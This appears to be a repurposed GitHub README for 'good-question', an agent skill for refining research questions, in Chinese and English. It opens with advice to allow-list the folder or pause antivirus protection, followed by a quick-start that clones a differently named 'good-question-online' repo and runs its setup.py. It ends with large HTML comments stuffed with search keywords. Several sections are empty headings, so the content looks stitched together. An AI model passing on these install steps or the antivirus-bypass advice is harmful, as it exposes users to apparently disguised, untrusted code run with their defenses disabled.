# Good Question


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ConsciousnessPhase/good-question-online.git
cd good-question-online
python setup.py
```


<picture>
  <source srcset="assets/good-question-integrated-banner-1280.webp" type="image/webp">
  <img src="assets/good-question-integrated-banner-1280.png" alt="Good Question hero" width="1280">
</picture>

<p align="center">
  <img alt="License MIT" src="https://img.shields.io/badge/License-MIT-1F5E4A?style=for-the-badge">
  <img alt="Hosts Codex and Claude Code" src="https://img.shields.io/badge/Hosts-Codex%20%7C%20Claude%20Code-D9A441?style=for-the-badge">
  <img alt="Status Active Development" src="https://img.shields.io/badge/Status-Active%20Development-6B8F71?style=for-the-badge">
</p>

<p align="center">
  <a href="#zh-cn">中文</a> | <a href="#english">English</a>
</p>

<a id="zh-cn"></a>

## 中文

`good-question` 是一个帮助研究者打磨科研问题的 agent skill。

它适合这样的时刻：你有一个方向、一个文献 gap、一个 proposal 摘要，或者一堆看起来都能做的想法，但还不确定哪个问题真正值得投入。它不会只给你一串灵感，而是逼近一个更好的研究问题：为什么重要，怎么被证据触及，哪些解释在竞争，什么结果会推翻它，下一步该做什么。

### 你可以用它做什么

| 你的状态 | 它会帮你做什么 |
|---|---|
| 只有一个模糊兴趣 | 把兴趣拆成可比较的候选问题 |
| 找到了文献 gap | 判断这个 gap 是否真的有理论或实践价值 |
| 已经有一个想法 | 检查重要性、可行性、可证伪性和两周 pilot |
| 想做机制解释 | 拆出竞争性假设和关键判别实验 |
| 准备 proposal 或基金 | 模拟评审会攻击哪里，并给出修补方式 |
| 方向依赖近期进展 | 先做公开来源的 domain brief，再定制问题 |
| 项目卡住了 | 用边界条件、失败信号和条件变化重新定位问题 |

### 它会输出什么

通常会得到一张或几张 `Good Question Card`。中文用户默认会得到类似这样的本地化卡片：

```markdown
**暂定题目：** ...
**核心研究问题：** ...
**为什么值得做：** ...
**它挑战了什么默认假设：** ...
**竞争性解释：** ...
**关键判别证据或实验：** ...
**什么结果会推翻它：** ...
**两周内可做的 pilot：** ...
**最强评审质疑：** ...
**下一步动作：** ...
```

重点不是把话说漂亮，而是让你能判断：这个问题值不值得继续推进。


### 不同领域怎么用

如果你来自生态、遥感、AI4Science、社会科学、生物医学、人文解释型研究或工程系统，先看 [`docs/field-playbooks.md`](docs/field-playbooks.md)。

它不是给 agent 的方法卡，而是给研究者的使用指南：每个领域应该提供什么上下文、常见弱问题是什么、好问题通常长什么样、评审最容易攻击哪里，以及该选择导师/评审/合作者/基金哪种模式。

### 它如何工作

`good-question` 的流程很简单，但会比较严格：

### 什么是好问题

在这个项目里，一个 good question 至少要通过七个检查：

### 方法来源

这个 skill 不是凭空写出来的一套 prompt。它把一些可靠来源中的科研思维动作沉淀成可复用流程：

| 来源线索 | 这个项目吸收了什么 |
|---|---|
| Alon, Fischbach, Stanford Engineering [1][2][3] | 选问题是一种可训练能力，要比较问题、识别陷阱，不要方法先行 |
| Platt [4] | 好问题应该能产生竞争性假设和判别实验 |
| Alvesson & Sandberg [5] | 不要只找 gap，要挑战文献背后的默认假设 |
| Heilmeier Catechism [6] | proposal 必须说清楚目标、受众、风险、成功标准和失败标准 |
| Hamming, Nielsen [7][8] | 科研品味来自长期维护重要问题清单和可攻击机会 |
| Peters [9] | 好问题常常来自对文献、不确定性和约束的反复重写 |
| Orchestra Research [10] | 用结构化 lenses 发散，再用严格标准收束 |

### 质量与发布门禁

这个项目把问题打磨当成可测试的流程，而不是一次性 prompt。发布前请看 [`docs/release-checklist.md`](docs/release-checklist.md)；贡献案例、领域指南或 source-audit eval 前请看 [`CONTRIBUTING.md`](CONTRIBUTING.md)。

大范围发布至少应通过两类检查：`evals/pressure-cases.md` 检查是否能抵抗方法先行、gap 先行、空泛 impact 等常见失败；`evals/source-audit-cases.md` 检查引用是否真的支持对应 claim。

发布前可以先运行结构门禁：

```powershell
powershell -ExecutionPolicy Bypass -File scripts/verify-release.ps1 -Level broad
```

### 能力边界

`good-question` 可以帮你把问题变尖，但它不是全知百科，不会替你编造领域共识。需要当前领域信息或本地知识不足时，它应该显式进入增强检索，先基于公开来源形成 brief，再明确哪些判断来自证据，哪些只是推断。
它不会把“我没查到”写成“没人做过”，也不会在没有来源时声称某个 gap、共识或最新趋势已经成立。

它也不会把每个想法都包装成“可做”。如果一个问题只有 novelty、没有受众、无法证伪，或者负结果学不到东西，它会建议重写、搁置或放弃。

<p align="right"><a href="#good-question">回到顶部</a> | <a href="#english">English</a></p>

<a id="english"></a>

## English

`good-question` is a portable agent skill for sharpening research questions.

Use it when you have a direction, a literature gap, a proposal sketch, or several possible ideas, but you are not sure which question is worth real work. It does not simply list ideas. It helps turn a rough direction into a question with stakes, rivals, falsifiers, a feasible pilot, and a clear next move.

### What It Helps With

| Your situation | What it helps you do |
|---|---|
| Broad interest | Turn it into comparable candidate questions |
| Literature gap | Decide whether the gap has real theoretical or practical value |
| Early idea | Test importance, feasibility, falsifiability, and a two-week pilot |
| Mechanism question | Build rival hypotheses and discriminating tests |
| Proposal or grant | Find reviewer objections and repair the weak points |
| Field depends on recent work | Build a public-source domain brief before question generation |
| Stalled project | Reframe through boundaries, failure signals, and changed conditions |

### What You Get

The usual output is one or more `Good Question Card`s:

```markdown
**Working title:** ...
**Research question:** ...
**Why it matters:** ...
**Core assumption challenged:** ...
**Competing hypotheses:** ...
**Discriminating observation or experiment:** ...
**What would falsify it:** ...
**Two-week pilot:** ...
**Strongest reviewer objection:** ...
**Best next action:** ...
```

The goal is not prettier wording. The goal is a better decision about whether the question deserves your time.


### Field Playbooks

If you work in ecology, remote sensing, AI4Science, social science, biomedicine, humanities, or engineering systems, start with [`docs/field-playbooks.md`](docs/field-playbooks.md).

It is a human-facing guide, not an agent method card. It shows what context to provide, common weak questions in each field, what stronger questions usually look like, likely reviewer objections, and which mode to choose.

### How It Works

The workflow is simple, but strict:

### What Counts As A Good Question

In this project, a good question should pass at least seven checks:

### Method Sources

This is not just a prompt bundle. It turns research-method advice from reliable sources into reusable agent workflow:

| Source line | What this project uses |
|---|---|
| Alon, Fischbach, Stanford Engineering [1][2][3] | Problem choice is trainable: compare questions, surface traps, and avoid method-first projects |
| Platt [4] | Strong questions create rival hypotheses and discriminating tests |
| Alvesson & Sandberg [5] | Move beyond gap-spotting by challenging assumptions |
| Heilmeier Catechism [6] | Proposals need clear goals, audience, risks, success criteria, and failure criteria |
| Hamming, Nielsen [7][8] | Research taste comes from important-problems lists and attackable openings |
| Peters [9] | Good questions often emerge through iterative rewriting of literature, uncertainty, and constraints |
| Orchestra Research [10] | Diverge with structured lenses, then converge with strict standards |

### Quality Gates

This project treats question-sharpening as a testable workflow, not a one-off prompt. Before releasing, use [`docs/release-checklist.md`](docs/release-checklist.md). Before contributing cases, field guidance, or source-audit tests, use [`CONTRIBUTING.md`](CONTRIBUTING.md).

Broad releases should pass both `evals/pressure-cases.md`, which checks resistance to method-first, gap-first, and vague-impact failures, and `evals/source-audit-cases.md`, which checks whether citations support the claims attached to them.

Before release, run the structural gate:

```powershell
powershell -ExecutionPolicy Bypass -File scripts/verify-release.ps1 -Level broad
```

Mature-product work has a stricter operating model:

- Read [`docs/mature-release-operating-model.md`](docs/mature-release-operating-model.md) before calling the skill mature.
- Record the readiness decision with [`evals/mature-release-run-template.md`](evals/mature-release-run-template.md).
- Run `powershell -ExecutionPolicy Bypass -File scripts/verify-release.ps1 -Level mature`; if the gate fails, keep the release labeled broad/public beta.

### Limits

`good-question` can make a question sharper, but it is not an omniscient encyclopedia and should not invent field consensus. When current field context matters or local knowledge is insufficient, it should explicitly enter enhanced retrieval, build a public-source brief first, and label what is evidence versus inference.
It should not turn "I did not find work on X" into "nobody has studied X", and it should not assert a literature gap, consensus, or latest trend without sources.

It also should not make every idea look viable. If a candidate is only novel, has no audience, cannot fail, or teaches nothing when negative, it should be rewritten, parked, or discarded.

<p align="right"><a href="#good-question">Back to top</a> | <a href="#zh-cn">中文</a></p>

## References / 参考文献

The references below are cited as methodological sources for the skill, not as decoration.



<!-- python pip pypi package library module script tool windows linux macos -->
<!-- good-question-online - tool utility software - download install setup -->
<!-- good question online error | launch good-question-online | good-question-online creator | good-question-online cli | modern good-question-online | setup good-question-online mobile | open advanced good-question-online | build safe good-question-online | download good-question-online | setup portable good-question-online | install good-question-online generator | good-question-online fork | free good-question-online app | quickstart good-question-online desktop | free good-question-online tool | arch safe good-question-online | free good-question-online generator | reliable good-question-online compressor | how to build online good-question-online decoder | windows low latency good-question-online | compile good-question-online | setup good-question-online reader | arch good-question-online downloader | extensible good-question-online service | top good-question-online framework | safe good-question-online | demo local good-question-online application | good-question-online monitor | stable good-question-online creator | 2025 open source good-question-online | how to build good-question-online | good-question-online client | debian portable good-question-online | quickstart good-question-online alternative | best good-question-online extension | build modern good-question-online | good-question-online copy | open good-question-online decoder | advanced good-question-online module | lightweight good-question-online uploader | good-question-online engine | build good-question-online binding | download for mac high performance good-question-online utility | zip good-question-online desktop | good question online kubernetes | cross platform good-question-online analyzer | tutorial good-question-online tracker | how to download best good-question-online | reliable good-question-online monitor | fast good-question-online engine -->
<!-- good question online documentation | how to deploy good-question-online replacement | wiki lightweight good-question-online | is good question online safe | install good-question-online binding | open source good-question-online analyzer | good question online saas | customizable good-question-online builder | zip good-question-online tracker | how to run portable good-question-online monitor | how to configure reliable good-question-online framework | run on mac fast good-question-online | local good-question-online app | download for linux good-question-online editor | online good-question-online mirror | how to setup good-question-online | secure good-question-online tool | good question online ci cd | reliable good-question-online | examples good-question-online service | tar.gz extensible good-question-online | good-question-online reader | good-question-online scanner | modern good-question-online mirror | good question online workshop | good question online github | getting started good-question-online debugger | low latency good-question-online parser | 2026 good-question-online checker | sample good-question-online software | beginner online good-question-online desktop | how to configure good-question-online engine | simple good-question-online binding | open source good-question-online replacement | zip lightweight good-question-online | debian free good-question-online desktop | customizable good-question-online application | download good-question-online desktop | tutorial good-question-online | how to download simple good-question-online | example good-question-online parser | configurable good-question-online creator | lightweight good-question-online app | git clone good-question-online cli | how to use good-question-online tool | run on linux good-question-online mirror | easy good-question-online debugger | demo good-question-online encoder | how to configure good-question-online copy | high performance good-question-online creator -->
<!-- is good question online good | reliable good-question-online copy | simple good-question-online extension | good-question-online server | getting started good-question-online extractor | top good-question-online program | configurable good-question-online client | tar.gz good-question-online | how to run github good-question-online | guide good-question-online wrapper | extensible good-question-online decoder | good-question-online editor | open good-question-online desktop | production ready good-question-online clone | setup reliable good-question-online | 2026 good-question-online debugger | good-question-online mobile | 2025 good-question-online addon | good-question-online web | minimal good-question-online | online good-question-online mobile | download for linux good-question-online decoder | extensible good-question-online | portable good-question-online downloader | good question online course | top good-question-online tool | setup github good-question-online | how to deploy good-question-online engine | good question online article | portable good-question-online debugger | good question online cloud | git clone good-question-online creator | configure modular good-question-online | run on mac github good-question-online | stable good-question-online logger | good-question-online uploader | free good-question-online debugger | configure offline good-question-online | good-question-online parser | 2025 good-question-online debugger | updated secure good-question-online reader | 2025 good-question-online wrapper | good-question-online program | configurable good-question-online downloader | configure extensible good-question-online | open source good-question-online mirror | good question online webinar | good question online not working | compile good-question-online creator | stable good-question-online uploader -->
<!-- example good-question-online reader | demo customizable good-question-online client | good-question-online addon | how to deploy self hosted good-question-online | ubuntu configurable good-question-online | best good-question-online debugger | deploy good-question-online | setup good-question-online wrapper | docs good-question-online desktop | deploy cross platform good-question-online encoder | source code good-question-online editor | good question online book | portable good-question-online cli | example good-question-online software | configurable good-question-online | get self hosted good-question-online | good-question-online software | arch good-question-online generator | secure good-question-online builder | latest version good-question-online module | how to configure lightweight good-question-online | native good-question-online monitor | windows good-question-online copy | offline good-question-online desktop | launch good-question-online analyzer | good-question-online extension | easy good-question-online | download for mac good-question-online encoder | good-question-online gui | best good-question-online scanner | good question online bug | run good-question-online parser | lightweight good-question-online decoder | stable good-question-online | lightweight good-question-online reader | wiki portable good-question-online encoder | online good-question-online | launch good-question-online tester | high performance good-question-online library | modern good-question-online clone | build good-question-online | open good-question-online clone | how to install good-question-online plugin | how to use online good-question-online module | high performance good-question-online uploader | getting started good-question-online | compile github good-question-online app | github good-question-online decoder | run on mac good-question-online api | how to download native good-question-online -->
<!-- execute open source good-question-online app | download for mac safe good-question-online | high performance good-question-online tool | quickstart open source good-question-online builder | beginner easy good-question-online | download for windows good-question-online api | wiki good-question-online mirror | deploy configurable good-question-online | open source good-question-online debugger | free good-question-online software | 2025 good-question-online logger | run good-question-online | run on windows good-question-online viewer | open source good-question-online library | run on windows good-question-online validator | run on mac good-question-online software | self hosted good-question-online tool | extensible good-question-online client | open good-question-online monitor | online good-question-online uploader | run on linux portable good-question-online addon | docs good-question-online web | extensible good-question-online module | getting started good-question-online service | minimal good-question-online analyzer | linux good-question-online compressor | tar.gz good-question-online checker | good question online cheat sheet | modular good-question-online binding | new version good-question-online encoder | 2026 easy good-question-online | customizable good-question-online reader | offline good-question-online tester | how to run good-question-online creator | download for windows good-question-online tester | run good-question-online web | execute good-question-online service | install secure good-question-online | centos good-question-online converter | high performance good-question-online binding | good question online example | modular good-question-online | free good-question-online addon | latest version good-question-online api | download good-question-online debugger | self hosted good-question-online downloader | 2026 good-question-online utility | 2026 good-question-online | github minimal good-question-online plugin | examples low latency good-question-online application -->
<!-- offline good-question-online plugin | advanced good-question-online alternative | lightweight good-question-online copy | configurable good-question-online wrapper | local good-question-online server | fedora offline good-question-online | download for linux good-question-online scanner | production ready good-question-online fork | fedora good-question-online software | quick start good-question-online software | offline good-question-online optimizer | download for linux good-question-online | github good-question-online engine | good-question-online converter | powerful good-question-online wrapper | quick start good-question-online server | demo good-question-online extractor | windows good-question-online program | run on linux good-question-online | good question online help | git clone good-question-online decoder | compile online good-question-online | setup good-question-online app | good-question-online port | portable good-question-online parser | fedora good-question-online uploader | source code good-question-online encoder | get good-question-online library | ubuntu good-question-online application | git clone good-question-online app | compile top good-question-online | run on linux good-question-online tool | free download good-question-online library | arch production ready good-question-online alternative | 2025 secure good-question-online | local good-question-online | stable good-question-online tracker | good question online alternative | minimal good-question-online app | execute local good-question-online alternative | documentation good-question-online logger | free download good-question-online clone | github good-question-online replacement | documentation good-question-online checker | start good-question-online viewer | examples good-question-online viewer | how to setup reliable good-question-online extension | how to use good-question-online tester | download for mac good-question-online analyzer | low latency good-question-online server -->
<!-- best good-question-online library | good-question-online service | simple good-question-online validator | cross platform good-question-online mirror | good-question-online debugger | how to setup best good-question-online | download for mac good-question-online service | self hosted good-question-online plugin | compile good-question-online debugger | run on linux good-question-online mobile | top good-question-online encoder | good-question-online package | compile good-question-online reader | how to download cross platform good-question-online | good question online support | low latency good-question-online port | run on linux good-question-online monitor | demo top good-question-online monitor | configure good-question-online monitor | how to run good-question-online | free good-question-online api | how to download good-question-online | 2026 safe good-question-online | how to install reliable good-question-online | how to install stable good-question-online | tar.gz good-question-online addon | fast good-question-online application | good question online guide | latest version fast good-question-online | linux good-question-online gui | walkthrough good-question-online replacement | wiki top good-question-online editor | download for windows good-question-online library | sample good-question-online | run on windows good-question-online debugger | tar.gz self hosted good-question-online sdk | run on mac good-question-online server | configure cross platform good-question-online | run on linux good-question-online checker | beginner configurable good-question-online mobile | best good-question-online | run on mac good-question-online uploader | customizable good-question-online validator | safe good-question-online editor | stable good-question-online validator | arch good-question-online | tar.gz good-question-online plugin | lightweight good-question-online tester | native good-question-online clone | wiki open source good-question-online cli -->
<!-- new version simple good-question-online | good question online blog | debian good-question-online checker | use good-question-online addon | run on windows modular good-question-online checker | how to install good-question-online editor | 2025 good-question-online sdk | download for windows native good-question-online | run on windows offline good-question-online | setup safe good-question-online | is good question online legit | updated lightweight good-question-online reader | wiki good-question-online | secure good-question-online | configurable good-question-online plugin | zip good-question-online sdk | how to setup good-question-online port | how to run good-question-online utility | arch offline good-question-online | free download good-question-online optimizer | simple good-question-online | fast good-question-online | high performance good-question-online utility | secure good-question-online tester | updated good-question-online parser | centos good-question-online service | self hosted good-question-online web | fedora good-question-online | good-question-online compressor | good-question-online alternative | good-question-online viewer | reliable good-question-online analyzer | beginner good-question-online checker | top good question online | github good-question-online cli | good-question-online downloader | github good-question-online | download for windows good-question-online viewer | stable good-question-online monitor | guide good-question-online | how to run good-question-online gui | customizable good-question-online | deploy good-question-online desktop | free download good-question-online encoder | good question online podcast | reliable good-question-online downloader | ubuntu good-question-online clone | high performance good-question-online debugger | good question online download | launch good-question-online app -->
<!-- new version good-question-online cli | run good-question-online downloader | how to install local good-question-online | native good-question-online | quickstart minimal good-question-online | powerful good-question-online tool | fast good-question-online mirror | build good-question-online downloader | walkthrough good-question-online sdk | good question online review | start good-question-online api | example good-question-online | documentation free good-question-online | production ready good-question-online web | how to build cross platform good-question-online | how to configure good-question-online | good question online reddit | how to build good-question-online optimizer | good-question-online platform | wiki good-question-online mobile | get good-question-online platform | updated good-question-online module | fedora good-question-online wrapper | beginner good-question-online platform | tar.gz native good-question-online | how to download good-question-online alternative | lightweight good-question-online addon | zip stable good-question-online | free good-question-online copy | how to build configurable good-question-online application | how to install good-question-online api | start good-question-online downloader | configure good-question-online | good-question-online binding | example good-question-online service | example cross platform good-question-online | how to run good-question-online reader | fast good-question-online debugger | get good-question-online viewer | use good-question-online mirror | deploy good-question-online app | quickstart good-question-online optimizer | source code good-question-online application | sample good-question-online monitor | windows good-question-online viewer | reliable good-question-online mirror | open source good-question-online parser | how to run best good-question-online wrapper | modular good-question-online server | fedora good-question-online extension -->
<!-- examples good-question-online web | safe good-question-online mobile | modern good-question-online parser | deploy good-question-online encoder | new version good-question-online sdk | ubuntu good-question-online converter | how to configure good-question-online service | install good-question-online package | updated good-question-online mobile | debian good-question-online | start good-question-online | modern good-question-online tool | customizable good-question-online service | download for mac online good-question-online | quick start configurable good-question-online | github good-question-online logger | open portable good-question-online | compile good-question-online binding | good-question-online tracker | getting started production ready good-question-online viewer | good-question-online validator | customizable good-question-online web | get lightweight good-question-online | documentation good-question-online | run good-question-online reader | github good-question-online service | advanced good-question-online scanner | configure good-question-online engine | execute good-question-online platform | how to download configurable good-question-online | good-question-online app | get good-question-online creator | download for mac free good-question-online | best good-question-online clone | good-question-online wrapper | self hosted good-question-online analyzer | how to use good-question-online platform | build good-question-online tool | good-question-online desktop | best good-question-online plugin | configure good-question-online addon | download good-question-online platform | fedora good-question-online validator | updated fast good-question-online | linux good-question-online mobile | macos good-question-online optimizer | tutorial good-question-online checker | beginner good-question-online debugger | good question online vs | how to install good-question-online -->

<!-- Last updated: 2026-06-09 18:27:11 -->
